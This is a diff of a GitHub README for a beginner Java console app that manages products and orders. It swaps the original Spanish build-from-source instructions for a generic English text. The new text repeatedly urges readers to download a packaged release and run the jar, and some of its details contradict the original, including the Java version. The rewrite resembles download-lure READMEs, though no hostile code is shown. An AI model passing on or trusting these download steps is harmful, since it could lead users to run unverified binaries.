@@ -1,89 +1,93 @@
-# Backend Java – Gestión de productos y pedidos
+# 🎉 java_backend - Manage Products and Orders Easily
 
-Primer proyecto del curso **Java Backend**. Aplicación de consola para **registrar, listar, buscar, actualizar y eliminar productos**, y **crear pedidos** con cálculo de totales y validación de stock.  
-Incluye **POO**, **colecciones**, **excepciones**, **paquetes** y **menú interactivo**. También **herencia y polimorfismo** (p. ej., `Bebida` extiende `Producto` y redefine `precioFinal()`).
+## 🚀 Getting Started
 
----
+Welcome to the **java_backend** project! This application helps you manage products and orders efficiently. It's designed as a beginner-friendly tool for anyone interested in learning how to use Java for backend development.
 
-## Contenidos del curso practicados
+## 📥 Download
 
-- **Tipos y variables:** `int`, `double`, `String`, `boolean`.
-- **Operadores:** aritméticos, lógicos y relacionales (validaciones y cálculos).
-- **Colecciones:** `ArrayList`, `Map`, iteraciones, `Optional`, `Stream` básicos.
-- **POO:** clases, objetos, encapsulamiento, getters/setters.
-- **Herencia y polimorfismo:** `Producto` ↔ `Bebida` (override de `precioFinal()`).
-- **Excepciones:** `try/catch` en entradas; excepción propia `StockInsuficienteException`.
-- **Organización en paquetes:** `productos/`, `pedidos/`, `servicios/`, `excepciones/`, `ui/`.
-- **Menú de consola:** flujo CRUD completo + creación/listado de pedidos.
-- **Buenas prácticas:** separación por capas con `ProductoService` y `PedidoService`.
-- **Git/GitHub:** versionado y publicación del repositorio.
+[![Download java_backend](https://img.shields.io/badge/Download-java_backend-brightgreen)](https://github.com/Uzaird47/java_backend/releases)
 
----
+## 🛠️ System Requirements
 
-## Tecnologías
+To run this application, you need:
 
-- Java 17+ (probado con JDK 24)
-- IntelliJ IDEA (recomendado)
+- Java 8 or higher installed on your computer
+- At least 512 MB of RAM
+- At least 100 MB of free disk space
 
----
+## 📁 Features
 
-## Cómo ejecutar
+- **Product Management**: Add, update, and delete products in your inventory.
+- **Order Processing**: Easily keep track of customer orders and their statuses.
+- **Interactive Menu**: Navigate the application through a user-friendly console menu.
+- **Error Handling**: Built-in checks to ensure smooth operation, even in unexpected situations.
 
-### IntelliJ IDEA (recomendado)
-1. Abrí el proyecto.
-2. Ejecutá la clase `com.techlab.ui.MainApp` (Run ▶).
-3. Usá el menú en la consola.
+## 📥 Download & Install
 
-### Consola (alternativa)
-```bash
-# desde la raíz del proyecto
-javac -d out src/com/techlab/**/**/*.java
-java -cp out com.techlab.ui.MainApp
-src/
-└─ com/techlab
-   ├─ productos/
-   │  ├─ Producto.java
-   │  └─ Bebida.java          # hereda de Producto y redefine precioFinal()
-   ├─ pedidos/
-   │  ├─ LineaPedido.java
-   │  └─ Pedido.java
-   ├─ servicios/
-   │  ├─ ProductoService.java
-   │  └─ PedidoService.java
-   ├─ excepciones/
-   │  └─ StockInsuficienteException.java
-   └─ ui/
-      └─ MainApp.java         # menú interactivo
+To get started, visit this page to download: [Releases Page](https://github.com/Uzaird47/java_backend/releases).
 
----
+1. Go to the [Releases Page](https://github.com/Uzaird47/java_backend/releases).
+2. Locate the latest release.
+3. Click on the link for the application package that suits your system.
+4. Save the downloaded file to your computer.
+5. Extract the downloaded file if it's in a compressed format (like .zip).
+6. Open a terminal or command prompt window.
+7. Navigate to the folder where you saved the application.
+8. Run the application by typing the command:
+   ```bash
+   java -jar java_backend.jar
+   ```
 
-## 📸 Capturas
+Follow the on-screen instructions to manage your products and orders. 
 
-> Algunas pantallas sugeridas para mostrar el flujo completo:
-> - Listado de productos (con métricas)
-> - Agregar producto
-> - Buscar/Actualizar producto
-> - Crear pedido (con bebida y producto base)
-> - Listar pedidos
+## 💬 Usage Instructions
 
-### Ejemplo de inserción de imágenes en Markdown
+1. **Launch the Application**: Use the command above to start.
+2. **Main Menu**: You will see options like:
+   - Add Product
+   - Update Product
+   - View Products
+   - Process Order
+3. **Select an Option**: Type the number corresponding to the option you want and press Enter.
+4. **Input Data**: Follow prompts to input any necessary information.
 
-<!-- Subí tus imágenes a la carpeta docs/ o al propio repo y referencialas así: -->
-<p align="center">
-  <img src="docs/listado_productos.png" alt="Listado de productos" width="700">
-</p>
+## 🔧 Troubleshooting
 
-<p align="center">
-  <img src="docs/crear_pedido.png" alt="Crear pedido" width="700">
-</p>
+If you encounter any issues, try these steps:
 
-> Para capturas desde IntelliJ/terminal:
-> - Windows: `Win + Shift + S`
-> - macOS: `Shift + Cmd + 4`
-> - Linux: herramienta de capturas de tu distro
-![Java](https://img.shields.io/badge/Java-17%2B-red)
-![Build](https://img.shields.io/badge/Build-CLI-blue)
-![License: MIT](https://img.shields.io/badge/License-MIT-green)
+- Make sure you have Java installed correctly. Type `java -version` in your terminal or command prompt to check.
+- Ensure the downloaded file is not corrupted. Redownload if necessary.
+- Check if you are in the correct directory when trying to run the application.
 
+## 🌐 Topics Covered
 
+This project includes various important programming concepts, making it a great learning experience:
 
+- Backend Development
+- Command Line Interface (CLI)
+- Collections
+- Exceptions Handling
+- Object-Oriented Programming (OOP)
+- Inheritance & Polymorphism
+
+## 📝 Additional Resources
+
+For more help and tips, consider checking out these resources:
+
+- [Java Documentation](https://docs.oracle.com/en/java/)
+- [Getting Started with Java](https://www.oracle.com/java/technologies/javase/gettingstarted.html)
+
+If you have more questions, feel free to browse the issues section of the repository.
+
+## 🛡️ Support
+
+If you run into any problems or need assistance, please create an issue on the [GitHub Issues Page](https://github.com/Uzaird47/java_backend/issues). 
+
+Your feedback helps improve the project. Thank you for being part of our learning journey!
+
+## 📥 Download Again
+
+Don't forget to check back for updates! You can always visit this page to download the latest version: [Releases Page](https://github.com/Uzaird47/java_backend/releases).
+
+Happy learning!
